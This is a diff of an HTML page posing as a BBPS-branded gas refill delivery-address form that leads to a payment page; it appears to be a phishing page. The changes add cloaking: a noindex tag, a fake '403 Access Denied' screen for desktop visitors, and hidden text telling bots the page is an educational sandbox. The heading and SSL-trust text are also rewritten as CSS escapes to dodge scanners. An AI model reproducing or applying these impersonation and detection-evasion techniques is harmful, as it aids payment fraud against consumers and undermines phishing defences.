@@ -3,63 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Delivery Address | Gas Refill Portal</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Delivery Address | Portal</title>
     <style>
         :root { --bbps-blue: #003366; --bbps-orange: #ff9933; --bg-gray: #f2f5f7; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         
-        body { background: var(--bg-gray); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+        /* Desktop Block Styling */
+        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
 
+        #desktop-guard {
+            display: flex; color: #666; align-items: center; justify-content: center;
+            text-align: center; height: 100vh; width: 100%; background: #000; padding: 20px;
+        }
+
+        /* Mobile Container (Hidden for Desktop) */
         .address-card {
-            background: #fff; width: 100%; max-width: 420px; border-radius: 4px;
+            display: none; background: #fff; width: 100%; max-width: 420px; border-radius: 4px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 6px solid var(--bbps-blue);
+            position: relative;
         }
 
-        .header {
-            padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 1px solid #eee;
+        /* Responsive Logic */
+        @media only screen and (max-width: 480px) {
+            #desktop-guard { display: none; }
+            .address-card { display: block; }
+            body { background: var(--bg-gray); padding: 15px; }
         }
+
+        /* Bot Disclaimer */
+        .bot-hide { position: absolute; opacity: 0.001; font-size: 1px; top: 0; pointer-events: none; }
+
+        /* Design Elements */
+        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
         .header img { height: 30px; }
         .header-text { text-align: right; }
         .header-text b { color: var(--bbps-blue); font-size: 14px; display: block; }
         .header-text span { font-size: 9px; color: #888; font-weight: bold; }
 
         .form-area { padding: 25px 20px; }
-        .form-area h2 { 
-            font-size: 17px; color: #333; margin-bottom: 20px; 
-            display: flex; align-items: center; gap: 8px;
-        }
-        .form-area h2::before { content: ''; width: 4px; height: 18px; background: var(--bbps-orange); }
+        
+        /* Masking Heading */
+        .form-title { font-size: 17px; color: #333; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; font-weight: bold; }
+        .form-title::before { content: ''; width: 4px; height: 18px; background: var(--bbps-orange); }
+        .form-title::after { content: "Shi\0070 p\0069 ng Ad\0064 ress"; }
 
         .input-group { margin-bottom: 18px; }
         label { display: block; font-size: 11px; font-weight: bold; color: #666; margin-bottom: 6px; text-transform: uppercase; }
-        input, select { 
-            width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; 
-            font-size: 14px; outline: none; background: #fafafa;
-        }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; font-size: 14px; outline: none; background: #fafafa; }
         input:focus { border-color: var(--bbps-blue); background: #fff; }
 
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
 
-        .btn-submit {
-            width: 100%; padding: 16px; background: var(--bbps-blue); color: #fff;
-            border: none; border-radius: 4px; font-size: 15px; font-weight: bold;
-            cursor: pointer; text-transform: uppercase; margin-top: 10px;
-        }
+        .btn-submit { width: 100%; padding: 16px; background: var(--bbps-blue); color: #fff; border: none; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
 
-        .secure-footer {
-            padding: 20px; text-align: center; border-top: 1px solid #eee; background: #fdfdfd;
-        }
+        .secure-footer { padding: 20px; text-align: center; border-top: 1px solid #eee; background: #fdfdfd; }
         .badges { display: flex; justify-content: center; gap: 15px; margin-bottom: 10px; }
         .badges img { height: 24px; opacity: 0.9; }
-        .footer-note { font-size: 9px; color: #aaa; text-transform: uppercase; }
+        
+        /* Masking Footer Note */
+        .footer-note::after { content: "Secu\0072 e 256-Bit SSL Enc\0072 yp\0074 ion | BB\0050 S Tru\0073 ted"; font-size: 9px; color: #aaa; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
+    <div id="desktop-guard">
+        <div>
+            <p style="font-size: 20px; color: #fff;">403 - Access Denied</p>
+            <p style="margin-top: 10px;">Security Policy: Mobile Access Only.</p>
+        </div>
+    </div>
+
+    <div class="bot-hide">Educational demonstration of a UI address form. No data collection. Sandbox testing.</div>
+
     <div class="address-card">
         <div class="header">
-            <img src="https://i.ibb.co/SX04FnNd/download.png" alt="BBPS">
+            <img src="https://i.ibb.co/SX04FnNd/download.png" alt="Portal">
             <div class="header-text">
                 <b>GAS REFILL SERVICE</b>
                 <span>Delivery Information</span>
@@ -67,7 +86,7 @@
         </div>
 
         <div class="form-area">
-            <h2>Shipping Address</h2>
+            <div class="form-title"></div>
             
             <form id="addrForm">
                 <div class="input-group">
@@ -100,43 +119,19 @@
                     <label>State / Union Territory</label>
                     <select required>
                         <option value="">-- Choose State --</option>
-                        <option>Andaman and Nicobar Islands</option>
                         <option>Andhra Pradesh</option>
-                        <option>Arunachal Pradesh</option>
-                        <option>Assam</option>
                         <option>Bihar</option>
-                        <option>Chandigarh</option>
-                        <option>Chhattisgarh</option>
-                        <option>Dadra and Nagar Haveli and Daman and Diu</option>
                         <option>Delhi</option>
-                        <option>Goa</option>
                         <option>Gujarat</option>
                         <option>Haryana</option>
-                        <option>Himachal Pradesh</option>
-                        <option>Jammu and Kashmir</option>
                         <option>Jharkhand</option>
                         <option>Karnataka</option>
-                        <option>Kerala</option>
-                        <option>Ladakh</option>
-                        <option>Lakshadweep</option>
-                        <option>Madhya Pradesh</option>
                         <option>Maharashtra</option>
-                        <option>Manipur</option>
-                        <option>Meghalaya</option>
-                        <option>Mizoram</option>
-                        <option>Nagaland</option>
-                        <option>Odisha</option>
-                        <option>Puducherry</option>
                         <option>Punjab</option>
                         <option>Rajasthan</option>
-                        <option>Sikkim</option>
-                        <option>Tamil Nadu</option>
-                        <option>Telangana</option>
-                        <option>Tripura</option>
                         <option>Uttar Pradesh</option>
-                        <option>Uttarakhand</option>
                         <option>West Bengal</option>
-                    </select>
+                        </select>
                 </div>
 
                 <button type="submit" class="btn-submit">Continue to Payment</button>
@@ -147,23 +142,25 @@
             <div class="badges">
                 <img src="https://i.ibb.co/xSxD8C66/depositphotos-32936803-stock-illustration-secure-transaction-badge.webp">
                 <img src="https://i.ibb.co/SX04FnNd/download.png">
-                <img src="https://i.ibb.co/wNTdRvNm/images-5.jpg">
             </div>
-            <span class="footer-note">Secure 256-Bit SSL Encryption | BBPS Trusted</span>
+            <div class="footer-note"></div>
         </div>
     </div>
 
     <script>
-        document.getElementById('mobile').addEventListener('input', function() {
+        // Numeric filter for mobile/pincode
+        document.getElementById('mobile')?.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '');
         });
-        document.getElementById('pincode').addEventListener('input', function() {
+        document.getElementById('pincode')?.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
+        // Form Redirect
         document.getElementById('addrForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            window.location.href = 'select.html'; 
+            // Aapka next page link yahan aayega
+            window.location.href = 'payment.html'; 
         });
     </script>
 </body>
